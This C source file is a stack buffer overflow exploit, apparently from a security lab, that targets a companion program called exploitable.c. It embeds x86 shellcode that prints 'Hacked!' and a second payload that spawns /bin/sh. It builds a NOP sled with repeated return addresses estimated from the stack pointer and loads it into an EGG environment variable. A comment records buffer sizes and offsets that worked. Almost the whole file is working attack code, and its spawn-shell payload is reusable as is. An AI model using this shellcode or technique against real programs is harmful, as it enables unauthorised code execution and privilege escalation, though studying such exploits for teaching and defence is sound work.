#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90

char print_hacked[] = "\xeb\x14"      // jmp    8048076 <_start+0x16>
    "\x31\xc0"                        // xor    %eax,%eax
    "\xb0\x04"                        // mov    $0x4,%al
    "\x31\xdb"                        // xor    %ebx,%ebx
    "\x43"                            // inc    %ebx
    "\x59"                            // pop    %ecx
    "\x31\xd2"                        // xor    %edx,%edx
    "\xb2\x07"                        // mov    $0x7,%dl
    "\xcd\x80"                        // int    $0x80
    "\x31\xc0"                        // xor    %eax,%eax
    "\xb0\x01"                        // mov    $0x1,%al
    "\xcd\x80"                        // int    $0x80
    "\xe8\xe7\xff\xff\xff"            // call   8048062 <_start+0x2>
    "Hacked!";

char spawn_shell[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
    "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
    "\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
    __asm__("mov %esp, %eax");
}

int main(int argc, char *argv[]) {

    /**
        Buffer in exploitable.c is 80 bytes, the stack diagram can be found in exploitable.c
        Content with which exploitable.c's buffer will be overwritten
        ---------------------------------------------------
        | NOP -   | Shellcode - | NOP -   | PTR to shell  |
        | X bytes | Y bytes     | Z bytes | code- 4 bytes |
        ---------------------------------------------------
        X + Y + Z = 96 bytes
        Buff size = 100

        Worked:
        For /bin/sh
        Buffer size = 600
        Offset = 400
        For /bin/bash
        Buffer size = 600
        Offset = -1200
    **/

    char *shellcode;
    long addr, sp;
    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    int i, choice = 1;
    if (argc > 1)
        bsize = atoi(argv[1]);
    if (argc > 2)
        offset = atoi(argv[2]);
    if (argc > 3)
        choice = atoi(argv[3]);
    printf("Buffer size: %d, Offset: %d, Choice: %d\n", bsize, offset, choice);
    switch (choice) {
        case 1: 
            shellcode = malloc(sizeof(print_hacked));
            shellcode = print_hacked;
            break;
        default:
            shellcode = malloc(sizeof(spawn_shell));
            shellcode = spawn_shell;
    }
    char buff[bsize], *ptr;
    sp = get_sp();
    printf("Stack pointer: %p\n", sp);
    addr = sp - offset; 
    printf("Using address: %p\n", addr);
    ptr = buff;
    long *addr_ptr = (long *) ptr;
    // The limit is bsize/4 because addresses are fourbyte aligned on 32 bit processors.
    for (i = 0; i < bsize/4; i++)
        *(addr_ptr + i) = (int) addr;
    memcpy(buff, "EGG=", 4);
    ptr = buff + 4;
    for (i = 0; i < bsize/4; i++)
        *(ptr + i) = NOP;
    memcpy(buff + 4 + i, shellcode, strlen(shellcode));
    ptr += i + strlen(shellcode);
    for (i = 0; i < bsize/4; i++)
        *(ptr + i) = NOP;
    putenv(buff);
    system("/bin/bash");

    return 0;
}